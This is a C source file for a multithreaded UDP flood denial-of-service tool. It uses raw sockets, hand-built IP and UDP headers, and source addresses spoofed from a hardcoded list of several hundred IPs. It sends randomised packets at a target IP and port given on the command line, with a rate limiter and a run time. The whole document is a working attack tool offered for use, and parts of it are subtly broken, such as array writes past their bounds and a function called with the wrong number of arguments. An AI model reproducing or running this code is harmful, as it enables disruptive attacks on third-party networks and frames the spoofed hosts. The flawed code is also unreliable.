#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b4
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
int packet_size;
void print_ip(int ip)
{
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
}
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; 
    } else {
        low_num = max_num + 1; 
        hi_num = min_num;
    }


    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 7;
        iph->id = htonl(1194 + rand_cmwc() % 50000);
        iph->frag_off = 0;
        iph->ttl = 128;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        
}

void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(50000 + rand_cmwc() % 65535);
    udph->dest = htons(floodport);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x84\x51\x54\x67\x98\x11\x72", 7);
    udph->len=htons(sizeof(struct udphdr) + 7);
}

void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(22 + rand_cmwc() % 1194);
        sin.sin_addr.s_addr = inet_addr(td);

        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
                fprintf(stderr, "Could not open raw socket.\n");
                exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_udp_header(udph);


        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);

		
		int sport[packet_size];
		unsigned char payload1[packet_size];
		
		for(int i = 0; i <= packet_size; i++){
				
				sport[i] = htons(randnum(50000 + rand_cmwc() % 65535));
				payload1[i] = rand_cmwc();
		}

        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
                exit(-1);
        }
                init_rand(time(NULL));
        register unsigned int i;
        i = 0;

		int packet_lenght = 0;
		
		int fake_id = 0;
		
		int class[]= {2372231209,2728286747,1572769288,3339925505,2372233279,3254787125,1160024353,2328478311,3266388596,3238005002,1745910789,3455829265,1822614803,3355015169,3389792053,757144879,2734605396,1230980369,3639549962,2728310654,3256452616,3561573700,2918529833,2890221130,2918997764,2453837834,3369835018,3256452681,3007103780,1137178634,3264375402,3229415686,2728310653,3627732067,2890220626,1137178635,3391077889,1745910533,1755074592,16843009,1092011777,3223532318,2918529914,621985916,2728287341,1191626519,2890184316,1822618132,1168895755,3639551498,3455827995,3338431589,3222035998,1731284993,1540078376,3423468322,3254790913,2372224268,2372233305,1822611509,3639550986,2918529633,2890217035,2728286295,2728310634,1488976481,3372614717,3224391454,3223389196,2728329505,1760832002,879920151,3328983856,2728310645,2627363865,2372224322,1499753002,1386562582,875052612,3426605106,2890251825,2728286223,2728310638,2328478534,1822614881,879919113,846476877,3390912871,3238005001,2734604550,1746152824,1539838052,1475895815,1123085431,3639550485,3397779518,3254783489,3223277598,3236292914,2728329249,249627429,1745909765,3339148045,2890217051,1822614887,1746125597,1358538789,839341370,3732673086,3238005000,3221554718,3187841866,2918529910,2542501898,2372224274,1509469200,1121752324,3588504106,3281714501,2372231173,2354214403,1877438500,1746504997,1572678189,1386570514,1123631710,778390842,3562249811,3357634306,3355320065,3352559669,2918529846,2734605379,2728310629,2728292211,2627370561,1822618129,1121752339,879905324,864886835,401541676,3368085770,3281689978,3105469954,2734605380,2637637498,1746667045,1607997226,3226633758,2918529919,2918529639,2890216975,2734605608,2728310642,2627354890,2372224304,2372233499,1482909190,3475901778,3324575748,3221554177,3184129025,2890154342,2728303398,2673421074,2297665372,879919114,3627732078,3639551509,3423468304,3413598005,3355013121,3118228756,2890217308,2890217011,2728310650,2728292214,2627370049,2609248308,2061767504,401285152,3639550474,3544957520,3455828543,3221245464,3187838794,3118228793,2918529872,2609248268,225126924,1566231927,1559430661,1347043330,879905826,3367840010,3108454677,2745962606,2734604397,2734604388,2372226080,1541444905,763183627,3355643150,3234588170,2890217320,2372226403,2328477289,1746667301,1019160141,3455829021,3451508746,3352559679,3223953950,3036312413,2915649581,2728286231,2728295989,2609248267,1746883363,3495166517,3495166005,2728329546,2372226339,2354214404,225179146,1746651228,1755075616,1158721290,1123631699,757107306,3627734829,3588504105,3513807393,3372614671,3234222083,2918529587,2328472852,1822614857,1746651484,1729902934,16777217,1347570977,1249741850,401286176,3451508778,3339924993,3267263505,2890220602,2890217232,2734605610,2734604590,2627354634,2372233317,2061767503,3370514442,3224001822,3223391774,2890153573,2728286564,2609248309,2372231206,1746669130,1746505581,1746018670,1540324867,1490426385,3627734819,3571472426,3389791009,3339754505,3238004997,3224678942,3105432334,2918529646,2501132291,2372226408,2372233487,2372233333,1746505837,2916403734,2890153763,2609247813,2372231196,1822614893,1122525959,879894536,610792735,3588503850,3494790672,3350508607,3302533386,1572396061,1046910020,1039029042,778432376,679348486,3281684007,2728310635,2319739454,225126923,1822614869,1822614791,1390242054,1185293895,3629619233,3639549973,3356113973,3258558721,3224793118,3113151523,2918529907,2734605395,2728310655,1746669386,2734604591,2728310636,1760832065,1539137028,2728329756,2372231208,2372224328,879905323,675544612,634503170,3494653237,3162044975,3113716993,2919228438,2728310575,1054006394,3339146026,3339925761,3224087582,2328461595,225117528,1746152568,1092011009,879894535,97447234,3251539246,3223622673,3118228768,2728310632,2372233584,3627734830,3355643147,3339142145,3228574724,3221245453,2890152495,2734604396,2728310647,1822617914,1822612837,1494642712,3562246432,3238004993,3109164125,2745964819,2372231174,2264919306,1822617962,3647724345,3328294453,3224851230,3221245452,2728310599,2673449270,2609248307,2540009556,2372226378,1998378804,1745910021,879905827,676177781,3629620001,3254789121,3118786598,3113151522,2918529642,2728282915,1822617878,1746018414,1123077410,401541708,3339924737,2453837835,2151612981,1347928371,1249741851,2728286267,2734604551,2728286303,2372226052,3390923303,2734604389,1877351697,1475895816,2372231186,3663327556,3221245216,3639550997,3413595749,3252515125,2609247812,2372231207,2372226334,1746373394,3350509109,2372231195,3562380810,2918997773,3323221858,2918529663,2016704517,1475395139,1123631109,3238004999,1389915980,95573855,3238004998,3221245186,3118228769,3118228770,3225059358,3256452680,1779203355,1746883107,1760832066,1585621764,3222952990,3627734826};
        
		while(1){

				iph->saddr = htonl(class[rand_cmwc()%431]);
				udph->source = htons(sport[randnum(0,packet_size)]);
				
				packet_lenght = randnum(2, packet_size);
				int fake_id = rand_cmwc() & 0xFFFFFFFF;
				iph->id = htonl(fake_id);
				
				memcpy((void *)udph + sizeof(struct udphdr), payload1, packet_lenght);
				udph->len=htons(sizeof(struct udphdr) + packet_lenght);
				
				iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + packet_lenght;
				iph->check = csum ((unsigned short *) datagram, iph->tot_len);

				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

                pps++;
                if(i >= limiter)
                {
                        i = 0;
                        usleep(sleeptime);
                }
                i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 5){
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stdout, "Usage: %s <target IP> <port> <packet_size (use something higher than 501, 100 works sometimes> <number threads to use> <pps limiter, -1 for no limit> <time> \n", argv[0]);
                exit(-1);
        }

        fprintf(stdout, "Setting up Sockets...\n");

        int num_threads = atoi(argv[4]);
        int maxpps = atoi(argv[5]);
		
        floodport = atoi(argv[2]);
        packet_size = atoi(argv[3]);

        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];

        int multiplier = 20;

        int i;
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "Starting Flood...\n");
        for(i = 0;i<(atoi(argv[6])*multiplier);i++)
        {
                usleep((1000/multiplier)*1000);
                if((pps*multiplier) > maxpps)
                {
                        if(1 > limiter)
                        {
                                sleeptime+=100;
                        } else {
                                limiter--;
                        }
                } else {
                        limiter++;
                        if(sleeptime > 25)
                        {
                                sleeptime-=25;
                        } else {
                                sleeptime = 0;
                        }
                }
                pps = 0;
        }

        return 0;
}